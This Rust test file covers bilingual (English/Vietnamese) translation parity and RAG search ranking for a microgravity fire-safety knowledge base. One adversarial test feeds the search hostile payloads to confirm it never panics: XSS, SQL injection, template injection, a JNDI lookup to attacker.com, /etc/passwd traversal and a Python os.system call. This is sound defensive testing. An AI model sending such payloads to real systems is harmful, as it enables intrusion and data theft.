//! Comprehensive Parity, Benchmark, and Adversarial Resilience Tests
//! For Milestone 2: RAG Vector Search & i18n Localization.

use nasa_bebo_ignis::i18n::{
    format_api_key_label, format_critical_alert, format_critical_high_sub,
    format_legend_current_g, format_legend_current_pt, format_vent_flow_label,
    get_morphology_regime_info, get_protocol, get_regime_info, get_research_records,
    get_suppression_protocol, get_text, Language, ALL_KEYS, ALL_SUPPRESSION_MATERIAL_IDS,
};
use nasa_bebo_ignis::rag::{
    query_rag, NasaPsiVectorDb, RagQueryRequest,
};

#[test]
fn test_i18n_key_parity_201_keys() {
    // Assert exactly 201 keys registered
    assert_eq!(ALL_KEYS.len(), 201, "Expected exactly 201 translation keys");

    for &key in ALL_KEYS {
        let en_val = get_text(key, Language::En);
        let vi_val = get_text(key, Language::Vi);

        assert!(
            !en_val.is_empty(),
            "Key '{}' returned empty translation for English",
            key
        );
        assert!(
            !vi_val.is_empty(),
            "Key '{}' returned empty translation for Vietnamese",
            key
        );
    }
}

#[test]
fn test_i18n_fallback_robustness() {
    // Non-existent key should return empty string, never panic
    let non_existent = get_text("non_existent_key_xyz_12345", Language::En);
    assert_eq!(non_existent, "");

    // Loose language parsing
    assert_eq!(Language::from_str_loose("EN"), Language::En);
    assert_eq!(Language::from_str_loose("english"), Language::En);
    assert_eq!(Language::from_str_loose("vi"), Language::Vi);
    assert_eq!(Language::from_str_loose("unknown_lang_fallback"), Language::Vi);
}

#[test]
fn test_i18n_parameterized_formatters() {
    // 1. card_critical_high_sub
    let f1_vi = format_critical_high_sub(3, 7, Language::Vi);
    assert_eq!(f1_vi, "3 Nguy cấp • 7 Rủi ro cao");
    let f1_en = format_critical_high_sub(3, 7, Language::En);
    assert_eq!(f1_en, "3 Critical • 7 High Risk");

    // 2. api_key_label
    let f2_vi = format_api_key_label("Gemini", Language::Vi);
    assert_eq!(f2_vi, "Nhập API Key Gemini");
    let f2_en = format_api_key_label("OpenAI", Language::En);
    assert_eq!(f2_en, "Enter OpenAI API Key");

    // 3. legend_current_g
    let f3_vi = format_legend_current_g(0.16, Language::Vi);
    assert_eq!(f3_vi, "Trọng lực Hiện tại (0.16g)");
    let f3_en = format_legend_current_g(1.0, Language::En);
    assert_eq!(f3_en, "Current Gravity (1.00g)");

    // 4. legend_current_pt
    let f4_vi = format_legend_current_pt(12.0, Language::Vi);
    assert_eq!(f4_vi, "Điểm Vận hành Hiện tại (12 cm/s)");
    let f4_en = format_legend_current_pt(20.0, Language::En);
    assert_eq!(f4_en, "Current Operating Point (20 cm/s)");

    // 5. vent_flow_label
    let f5_vi = format_vent_flow_label(15.0, Language::Vi);
    assert_eq!(f5_vi, "Dòng Thông gió Vận hành (15 cm/s)");
    let f5_en = format_vent_flow_label(5.0, Language::En);
    assert_eq!(f5_en, "Operating Ventilation Flow (5 cm/s)");

    // 6. critical_alert
    let f6_vi = format_critical_alert(4, Language::Vi);
    assert_eq!(f6_vi, "CẢNH BÁO NGUY HIỂM: Phát hiện 4 vật liệu rủi ro cao!");
    let f6_en = format_critical_alert(2, Language::En);
    assert_eq!(f6_en, "CRITICAL ALERT: 2 high-risk materials identified!");
}

#[test]
fn test_i18n_suppression_database_10_materials() {
    assert_eq!(ALL_SUPPRESSION_MATERIAL_IDS.len(), 10);

    for &mat_id in ALL_SUPPRESSION_MATERIAL_IDS {
        for lang in [Language::En, Language::Vi] {
            let proto = get_suppression_protocol(mat_id, lang)
                .unwrap_or_else(|| panic!("Missing suppression protocol for {} in {:?}", mat_id, lang));

            assert!(!proto.name.is_empty(), "Empty name for {}", mat_id);
            assert!(!proto.action_1.is_empty(), "Empty action_1 for {}", mat_id);
            assert!(!proto.optimal_agent.is_empty(), "Empty optimal_agent for {}", mat_id);
            assert!(!proto.secondary_hazard.is_empty(), "Empty secondary_hazard for {}", mat_id);
            assert!(!proto.decontamination.is_empty(), "Empty decontamination for {}", mat_id);

            // Alias check
            let alias_proto = get_protocol(mat_id, lang).unwrap();
            assert_eq!(proto, alias_proto);
        }
    }

    // Invalid material ID check
    assert!(get_suppression_protocol("MAT-99", Language::En).is_none());
}

#[test]
fn test_i18n_research_records_7_projects() {
    let recs_en = get_research_records(Language::En);
    let recs_vi = get_research_records(Language::Vi);

    assert_eq!(recs_en.len(), 7, "Expected 7 flight research records in EN");
    assert_eq!(recs_vi.len(), 7, "Expected 7 flight research records in VI");

    let expected_psi_ids = [
        "PSI-SOFIE-GEL-412",
        "PSI-SAFFIRE-I-IV",
        "PSI-BASS-II-P849",
        "PSI-FLEX-ICE-102",
        "PSI-ACME-CIR-401",
        "PSI-MSG-FLOW-512",
        "NASA-STD-6001B-REV-B",
    ];

    for id in expected_psi_ids {
        assert!(recs_en.iter().any(|r| r.psi_id == id), "Missing {} in EN", id);
        assert!(recs_vi.iter().any(|r| r.psi_id == id), "Missing {} in VI", id);
    }
}

#[test]
fn test_i18n_morphology_regimes() {
    let regimes = [
        "EXTINGUISHED",
        "BUOYANT_TEARDROP",
        "SPHERICAL_DIFFUSION",
        "EXPANDING_HEMISPHERE",
    ];

    for reg in regimes {
        for lang in [Language::En, Language::Vi] {
            let info = get_morphology_regime_info(reg, 0.16, 10.0, 21.0, lang);
            assert!(!info.regime_name.is_empty());
            assert!(!info.morph_desc.is_empty());
            assert!(!info.soot_fraction.is_empty());

            // Alias check
            let alias_info = get_regime_info(reg, 0.16, 10.0, 21.0, lang);
            assert_eq!(info, alias_info);
        }
    }
}

#[test]
fn test_rag_4_canonical_benchmark_queries() {
    let db = NasaPsiVectorDb::new();

    // Query 1: PMMA Low-Flow Paradox
    let q1 = get_text("q1_text", Language::En);
    let r1 = db.search(q1, 3);
    assert!(!r1.is_empty(), "Q1 should return results");
    assert_eq!(
        r1[0].document.doc_id, "NASA-TM-2023-0014829",
        "Q1 must rank SoFIE PMMA as #1"
    );

    // Query 2: Water Suppression Ban in 0G
    let q2 = get_text("q2_text", Language::En);
    let r2 = db.search(q2, 3);
    assert!(!r2.is_empty(), "Q2 should return results");
    assert_eq!(
        r2[0].document.doc_id, "NASA-SP-2024-50021",
        "Q2 must rank Water Suppression Ban as #1"
    );

    // Query 3: Cool Flame Anomaly
    let q3 = get_text("q3_text", Language::En);
    let r3 = db.search(q3, 3);
    assert!(!r3.is_empty(), "Q3 should return results");
    assert_eq!(
        r3[0].document.doc_id, "SCI-FLEX-2012-1593",
        "Q3 must rank FLEX Cool Flames as #1"
    );

    // Query 4: Moon/Mars Fractional Gravity Dome
    let q4 = get_text("q4_text", Language::En);
    let r4 = db.search(q4, 3);
    assert!(!r4.is_empty(), "Q4 should return results");
    assert_eq!(
        r4[0].document.doc_id, "CI-2022-88",
        "Q4 must rank Fractional Gravity Hemispherical Dome as #1"
    );
}

#[test]
fn test_rag_adversarial_security_inputs() {
    let db = NasaPsiVectorDb::new();

    let malicious_payloads = [
        "<script>alert('XSS')</script>",
        "\"><svg onload=alert(1)>",
        "'; DROP TABLE materials; --",
        "{{7*7}}",
        "${jndi:ldap://attacker.com/a}",
        "../../../../../../etc/passwd",
        "\x00\x00\x00",
        &"A".repeat(10_000), // Buffer overflow stress
        "SELECT * FROM * WHERE 1=1",
        "{{config.items()}}",
        "__import__('os').system('dir')",
    ];

    for payload in malicious_payloads {
        // Search must never panic
        let results = db.search(payload, 3);

        // Synthesis must never panic
        let ans_en = db.synthesize_answer(payload, &results, Language::En);
        assert!(!ans_en.raw_answer.is_empty());
        assert!(!ans_en.directive_code.is_empty());

        let ans_vi = db.synthesize_answer(payload, &results, Language::Vi);
        assert!(!ans_vi.raw_answer.is_empty());
        assert!(!ans_vi.directive_code.is_empty());
    }
}

#[test]
fn test_rag_empty_and_out_of_domain_cutoff() {
    let db = NasaPsiVectorDb::new();

    // 1. Empty string
    let r_empty = db.search("", 3);
    assert!(r_empty.is_empty(), "Empty query must return empty list");

    // 2. Whitespace only
    let r_spaces = db.search("   \t\n   ", 3);
    assert!(r_spaces.is_empty(), "Whitespace query must return empty list");

    // 3. Irrelevant random string
    let r_gibberish = db.search("qwfpzxcvbnm123456789", 3);
    assert!(r_gibberish.is_empty(), "Irrelevant gibberish must be cutoff < 0.05");
}

#[test]
fn test_directive_answer_synthesis_blocks() {
    let db = NasaPsiVectorDb::new();

    let queries = [
        "Why is high velocity water prohibited in zero g?",
        "Explain cool flame phenomenon discovered in FLEX",
        "Why are Moon and Mars fires dome shaped?",
        "What is the PMMA low flow ventilation paradox?",
    ];

    for q in queries {
        for lang in [Language::En, Language::Vi] {
            let res = db.search(q, 3);
            let ans = db.synthesize_answer(q, &res, lang);

            assert!(!ans.directive_code.is_empty());
            assert!(!ans.classification.is_empty());
            assert!(!ans.kinetics_block.is_empty(), "Kinetics block empty for '{}'", q);
            assert!(!ans.standards_block.is_empty(), "Standards block empty for '{}'", q);
            assert!(!ans.emergency_block.is_empty(), "Emergency block empty for '{}'", q);
            assert!(!ans.raw_answer.is_empty(), "Raw answer empty for '{}'", q);
        }
    }
}

#[test]
fn test_query_rag_api_contract() {
    let req = RagQueryRequest {
        query: "What is PMMA low flow paradox?".to_string(),
        lang: "en".to_string(),
        top_k: 2,
    };

    let resp = query_rag(&req);
    assert_eq!(resp.query, req.query);
    assert_eq!(resp.ranked_documents.len(), 2);
    assert_eq!(resp.ranked_documents[0].doc_id, "NASA-TM-2023-0014829");
    assert!(!resp.directive_answer.raw_answer.is_empty());
}
